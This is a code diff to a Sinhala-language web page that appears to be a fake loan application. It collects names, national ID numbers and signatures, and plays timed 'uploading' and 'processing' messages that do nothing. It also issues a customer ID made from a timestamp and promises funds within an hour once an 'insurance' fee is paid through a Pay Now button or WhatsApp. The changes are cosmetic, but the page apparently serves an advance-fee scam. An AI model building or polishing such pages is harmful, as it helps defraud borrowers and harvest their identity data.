@@ -12,7 +12,7 @@ body{margin:0;font-family:system-ui;background:#eaeef3;}
 .page{padding:16px;}
 h3{text-align:center;}
 label{display:block;margin-top:14px;font-weight:600;}
-input{width:100%;padding:14px;margin-top:6px;border-radius:12px;border:1px solid #ccc;}
+input{width:100%;padding:14px;margin-top:6px;border-radius:12px;border:1px solid #ccc;font-size:16px;}
 button{width:100%;padding:14px;margin-top:14px;border:none;border-radius:14px;font-size:16px;color:#fff;}
 .next-btn{background:#27ae60;}
 .clear-btn{background:#e74c3c;}
@@ -89,15 +89,9 @@ canvas{width:100%;height:160px;border:2px dashed #aaa;border-radius:12px;margin-
 රක්ෂණ මුදල ගෙවීමෙන් පසු පැයක් ඇතුළත මුදල් බැර කෙරේ.
 </div>
 
-<button class="info-btn" onclick="openInsuranceInfo()">
-Insurance Payment හේතුව
-</button>
-
+<button class="info-btn" onclick="openInsuranceInfo()">Insurance Payment හේතුව</button>
 <button class="pay-btn" onclick="payNow()">Pay Now</button>
-
-<button class="whatsapp-btn" onclick="sendWhatsApp()">
-WhatsApp මගින් විස්තර යවන්න
-</button>
+<button class="whatsapp-btn" onclick="sendWhatsApp()">WhatsApp මගින් විස්තර යවන්න</button>
 </div>
 </div>
 
@@ -143,18 +137,24 @@ c.onpointermove=e=>{if(draw){ctx.lineTo(e.offsetX,e.offsetY);ctx.stroke();}}
 c.onpointerup=()=>draw=false;
 c.onpointerleave=()=>draw=false;
 
-function clearSign(){
- ctx.clearRect(0,0,c.width,c.height);
- resizeCanvas();
+function clearSign(){ctx.clearRect(0,0,c.width,c.height);resizeCanvas();}
+
+/* AUTO SCROLL PAGE 1 */
+const nameEl=document.getElementById("name");
+const nicEl=document.getElementById("nic");
+const amountEl=document.getElementById("amount");
+
+function scrollToEl(el){
+ setTimeout(()=>el.scrollIntoView({behavior:"smooth",block:"center"}),150);
 }
 
-/* NEXT WITH LOADING */
-function goNext(){
- const name=nameEl.value.trim();
- const nic=nicEl.value.trim();
- const amount=amountEl.value;
+nameEl.addEventListener("change",()=>{if(nameEl.value.length>2) scrollToEl(nicEl);});
+nicEl.addEventListener("change",()=>{if(nicEl.value.length>5) scrollToEl(amountEl);});
+amountEl.addEventListener("change",()=>{if(amountEl.value>0) scrollToEl(c);});
 
- if(!name||!nic||!amount){
+/* NEXT */
+function goNext(){
+ if(!nameEl.value||!nicEl.value||!amountEl.value){
   alert("කරුණාකර සියලු fields පුරවන්න");
   return;
  }
@@ -162,25 +162,19 @@ function goNext(){
  loading.style.display="flex";
  loadingText.innerText="විස්තර upload කරමින් පවතී...";
 
- setTimeout(()=>{
-  loadingText.innerText="ණය මුදල් ලබා ගැනීමට ඉදිරි පියවර complete කරමින්...";
- },5000);
+ setTimeout(()=>loadingText.innerText="ණය මුදල් ලබා ගැනීමට ඉදිරි පියවර complete කරමින්...",5000);
 
  setTimeout(()=>{
   loading.style.display="none";
-
   page1.style.display="none";
   page2.style.display="block";
 
   EZ_ID="EZ-"+Date.now();
   customerId.innerText=EZ_ID;
-  showAmount.innerText=amount;
-  insurance.innerText=calculateInsurance(amount);
+  showAmount.innerText=amountEl.value;
+  insurance.innerText=calculateInsurance(amountEl.value);
 
-  setTimeout(()=>{
-    page2.scrollIntoView({behavior:"smooth",block:"start"});
-  },200);
-
+  setTimeout(()=>page2.scrollIntoView({behavior:"smooth"}),200);
  },8000);
 }
 
@@ -200,21 +194,14 @@ function sendWhatsApp(){
 Customer ID: ${EZ_ID}
 Amount: Rs.${showAmount.innerText}
 Insurance: Rs.${insurance.innerText}
-Document Time: ${new Date().toLocaleString()}
-Status: Awaiting payment confirmation`;
-
+Time: ${new Date().toLocaleString()}`;
  window.open(`https://wa.me/${WHATSAPP_NO}?text=${encodeURIComponent(msg)}`);
 }
 
-/* INSURANCE INFO */
+/* INFO */
 function openInsuranceInfo(){
  window.open(INSURANCE_INFO_LINK,"_blank");
 }
-
-/* quick refs */
-const nameEl=document.getElementById("name");
-const nicEl=document.getElementById("nic");
-const amountEl=document.getElementById("amount");
 </script>
 </body>
 </html>
